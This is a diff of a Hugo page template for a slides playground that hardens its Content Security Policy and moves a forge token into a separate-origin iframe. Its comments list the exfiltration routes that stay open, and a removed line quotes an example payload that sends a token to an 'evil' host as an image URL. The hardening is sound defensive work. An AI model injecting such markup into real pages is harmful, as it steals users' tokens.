@@ -2,33 +2,40 @@
 <html lang="{{ partial "html-lang.html" site.Language }}">
 <head>
 <meta charset="utf-8">
+{{/* The git frame's origin (go-slides#90): the second origin that holds the
+     forge token and makes the forge calls. params.gitFrameOrigin overrides it
+     (the browser tests serve the frame from a loopback origin). */}}
+{{ $fo := default "https://go-slides-usercontent.github.io" site.Params.gitFrameOrigin }}
 {{/* The page's Content Security Policy. Everything not named falls back to
      default-src 'self': scripts, styles, fonts, workers, the wasm modules
      (wasm-unsafe-eval, not unsafe-eval), manifests, prefetches. connect-src
-     (fetch, XHR, WebSocket, beacons) is the page's own origin and the REST APIs
-     of the forges the GitHub pane talks to, which is where its token goes:
-     GitHub, and GitLab.com (its API and its OAuth token and revoke endpoints).
-     No object, no form, no <base>.
+     (fetch, XHR, WebSocket, beacons) is the page's own origin ONLY: this page
+     holds no forge token and calls no forge. The GitHub pane's token lives in
+     the git frame, an iframe of the origin above (frame-src names it and
+     nothing else but the page and blob:), which is the only document that
+     talks to api.github.com and gitlab.com, under a policy of its own
+     (.second-origin.json declares it; CI verifies it). No object, no form, no
+     <base>.
 
      What it does NOT close, and why: the preview and thumbnail frames are
      srcdoc iframes, and a srcdoc document INHERITS its embedder's policy on
      top of its own, so the page's img-src, media-src, style-src and font-src
      must allow what a deck links (https images, media, style sheets, fonts).
-     A script injected into the page itself could therefore still send a token
-     out as the URL of an image, a style sheet or a media file (a GET to any
-     https host); the page's other routes out (fetch, XHR, beacons, forms,
-     frames, objects, workers, scripts, base) are closed, and the token never
-     reaches the frames or the worker. browsertest/csp.cjs probes each route,
-     open and closed.
+     A script injected into the page itself can therefore still send what the
+     page holds out as the URL of an image, a style sheet or a media file (a GET
+     to any https host), and the page's other routes out (fetch, XHR, beacons,
+     forms, frames, objects, workers, scripts, base) are closed. What it holds
+     no longer includes a forge token: that is in the git frame, another
+     origin, which the page cannot read and which has no command that returns
+     it (go-slides#90; browsertest/git.cjs searches the page's memory, storage
+     and messages after a connect and a Remember). browsertest/csp.cjs probes
+     each route, open and closed.
 
-     Moving the preview to a document of its own (go-slides#90) was measured
-     in Chrome and does NOT close this: a blob: and a data: frame inherit the
-     page's policy like srcdoc; only a frame loaded from a URL gets a policy of
-     its own (measured, not derived from the CSP3 text), and the page then
-     hands that frame the deck as a message. A script injected into the page
-     can hand it markup too, <img src="https://evil/?t=TOKEN"> included, so the
-     route is moved, not closed: showing remote images from a deck IS sending
-     requests whose URL its author, or whoever drives the page, chooses.
+     Moving the PREVIEW to a document of its own was measured in Chrome and
+     does not close the image route: a blob: and a data: frame inherit the
+     page's policy like srcdoc, and a frame loaded from a URL gets its own but
+     is handed the deck by the page. That is why the token was removed from the
+     page instead.
 
      Three routes no directive governs either (go-slides#91): top-level
      navigation (navigate-to shipped in no browser), window.open, and DNS
@@ -39,7 +46,7 @@
      them (the frames' scripts are named by nonce in their own policy). No
      referrer leaves the page: a sign-in's code sits in its URL until the page
      cleans it. Pinned by TestPlaygroundPageCSP. */}}
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline' https:; img-src 'self' https: http: data: blob:; media-src 'self' https: data: blob:; font-src 'self' https: data: blob:; worker-src 'self' blob:; frame-src 'self' blob:; object-src 'none'; base-uri 'none'; form-action 'none'; connect-src 'self' https://api.github.com https://gitlab.com">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline' https:; img-src 'self' https: http: data: blob:; media-src 'self' https: data: blob:; font-src 'self' https: data: blob:; worker-src 'self' blob:; frame-src 'self' blob: {{ $fo }}; object-src 'none'; base-uri 'none'; form-action 'none'; connect-src 'self'">
 <meta name="referrer" content="no-referrer">
 <meta http-equiv="x-dns-prefetch-control" content="off">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -139,9 +146,9 @@ body.pg{overflow:hidden}
     });
   }catch(e){}
   globalThis.goSlidesLang=lang;
-  // The GitLab OAuth application (public client, PKCE, no secret) the GitHub
-  // pane signs in with; empty until one is registered (params.gitlabClientID).
-  globalThis.goSlidesGitLabClientID={{ default "" site.Params.gitlabClientID }};
+  // The git frame's origin: the only document that holds a forge token. The
+  // GitLab sign-in is the frame's own (its workflow names the application).
+  globalThis.goSlidesGitFrameOrigin={{ $fo }};
   // Cyrillic, Chinese, Japanese and Korean are drawn from a subset of Noto
   // Sans (a few hundred kilobytes, built from the language's repertoire), fetched
   // along with the module for those languages only.
